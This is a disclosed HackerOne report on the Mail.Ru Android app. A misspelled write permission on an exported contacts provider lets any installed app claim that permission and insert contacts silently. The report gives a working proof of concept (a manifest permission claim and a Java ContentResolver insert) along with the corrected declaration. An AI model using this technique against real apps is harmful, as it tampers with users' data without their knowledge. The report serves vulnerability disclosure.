---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '440749'
original_report_id: '440749'
title: '[Mail.Ru Android] Typo in permission name allows to write contacts without
  user knowledge'
team_handle: mailru
created_at: '2018-11-14T14:56:36.121Z'
disclosed_at: '2019-02-26T15:26:23.215Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 75
asset_identifier: ru.mail.mailapp
asset_type: GOOGLE_PLAY_APP_ID
max_severity: critical
tags:
- hackerone
---

# [Mail.Ru Android] Typo in permission name allows to write contacts without user knowledge

## Metadata

- HackerOne Report ID: 440749
- Weakness: 
- Program: mailru
- Disclosed At: 2019-02-26T15:26:23.215Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi, Mail.Ru app registers permission ``` write_contacts ```
```xml
    <permission android:label="@string/write_contact_permission" android:name="ru.mail.mailbox.contacts.permission.write_contacts" android:protectionLevel="dangerous"/>
```
but uses ``` write ```
```xml
        <provider android:label="@string/contacts" android:name="ru.mail.mailbox.content.contact.ContactsProvider" android:readPermission="android.permission.BIND_CHOOSER_TARGET_SERVICE" android:writePermission="ru.mail.mailbox.contacts.permission.write" android:enabled="true" android:exported="true" android:authorities="ru.mail.mailbox.contacts" android:syncable="false"/>
```
which is unclaimed, has ``` normal ``` protection level by default and automatically granted to all apps. It means that any third-party apps have ability to insert any data into that database

PoC
```xml
    <permission android:name="ru.mail.mailbox.contacts.permission.write" />
    <uses-permission android:name="ru.mail.mailbox.contacts.permission.write" />
```

```java
        ContentValues contentValues = new ContentValues();
        contentValues.put("display_name", "Test Zaheck");
        contentValues.put("email", "test@wow.ww");
        getContentResolver().insert(Uri.parse("content://ru.mail.mailbox.contacts/"), contentValues);
```

In the result that data is added to ``` /data/data/ru.mail.mailapp/databases/mail_contacts ```
{F375530}

And it's not displayed that my Zaheck app requires any contacts related permissions (only SD card read/write, but it's for my other PoCs)
{F375535}

It's recommended to change your provider declaration to
```xml
        <provider android:label="@string/contacts" android:name="ru.mail.mailbox.content.contact.ContactsProvider" android:readPermission="android.permission.BIND_CHOOSER_TARGET_SERVICE" android:writePermission="ru.mail.mailbox.contacts.permission.write_contacts" android:enabled="true" android:exported="true" android:authorities="ru.mail.mailbox.contacts" android:syncable="false"/>
```

## Impact

Typo in permission name allows to write contacts without user knowledge

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
